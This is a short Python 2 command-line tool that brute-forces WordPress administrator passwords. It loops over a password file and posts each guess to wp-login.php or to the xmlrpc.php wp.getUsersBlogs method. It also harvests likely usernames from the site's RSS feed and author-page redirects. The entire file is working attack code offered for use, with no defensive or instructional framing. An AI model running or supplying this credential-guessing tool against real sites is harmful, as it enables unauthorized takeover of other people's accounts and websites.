#!/usr/bin/env python
#coding:utf-8
__author__ = 'mtfly'

import requests
import string
import time
import re
from optparse import OptionParser

def crack_xmlrpc(username, password, url):
	crack_url = url + "/xmlrpc.php"
	#print crack_url
	post = '''
		<?xml version="1.0" encoding="iso-8859-1"?>
		<methodCall>
  		<methodName>wp.getUsersBlogs</methodName>
  		<params>
   		<param><value>''' + username + '''</value></param>
   		<param><value>''' + password + '''</value></param>
  		</params>
		</methodCall>'''
	headers = {
		'UserAgent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
		'Referer': crack_url
	}
	try:
		res = requests.post(url=crack_url, data=post, headers=headers, timeout=5).content
		#print "ok"
	except Exception, e:
		print "error", e
	else:
		if '<int>405</int>' in res:
			print "XML-RPC has been disabled. Please use the wp-admin.php"
		elif "faultCode" in res:
			print "The password is not:", password
		elif "isAdmin" in res:
			print "\nThe password is ", password
			exit()

def crack_wp_login(username, password, url):
	crack_url = url + "/wp-login.php"
	#print crack_url
	headers = {
		'UserAgent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
		'Content-Type': 'application/x-www-form-urlencoded'
	}
	post = {'log': username, 'pwd': password}
	try:
		res = requests.post(url=crack_url, data=post, headers=headers, timeout=5).content
	except Exception, e:
		print "error", e
	else:
		if 'lostpassword' in res:
			print "The password is not:", password
		elif "welcome-panel" in res:
			print "\nThe password is ", password
			exit()

def get_author(url):
	get_url0 = url + "/?feed=rss2"
	get_url1 = url + "/?author=1"
	headers = {
		'UserAgent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'
	}
	#print get_url
	try:
		res0 = requests.get(get_url0)
		res1 = requests.get(get_url1)
		html0 = res0.content
		html1 = res1.content
		s0 = re.findall('<dc:creator><\!\[CDATA\[(.*?)\]\]><\/dc:creator>',html0)
		s1 = re.findall('<title>(.*?)\s',html1)
		if len(s1) == 0:
			# print "null"
			# print res.url
			s1 = re.findall('author/(.*?)/', res1.url)
		s = s0 +s1
		print "The Username maybe:"
		for i in list(set(s)):
			print i
	except Exception, e:
		print e

p = OptionParser()
p.add_option('-u', '--url', type="string", help='Input the url')
p.add_option('-a', '--admin',default="admin", type="string", help='Input the username')
p.add_option('-g', '--getauthor',default=False, action="store_true", help='Get admin\'username')
p.add_option('-w', '--crack_wp_login',default=False, action="store_true", help='Crack by wp-login')
p.add_option('-x', '--crack_xmlrpc',default=False, action="store_true", help='Crack by xmlrpc')
options, args = p.parse_args()
url = options.url
admin = options.admin
author = options.getauthor
w = options.crack_wp_login
x = options.crack_xmlrpc

# url = "http://mtfly.net"
# url = "http://127.0.0.1/wp/"
print url
if author:
	get_author(url)
	exit()
f = open("pass.txt", "r")
for line in f:
	#print line.strip()
	if w:
		crack_wp_login(admin, line.strip(), url)
	if x:
		crack_xmlrpc(admin, line.strip(), url)
f.close
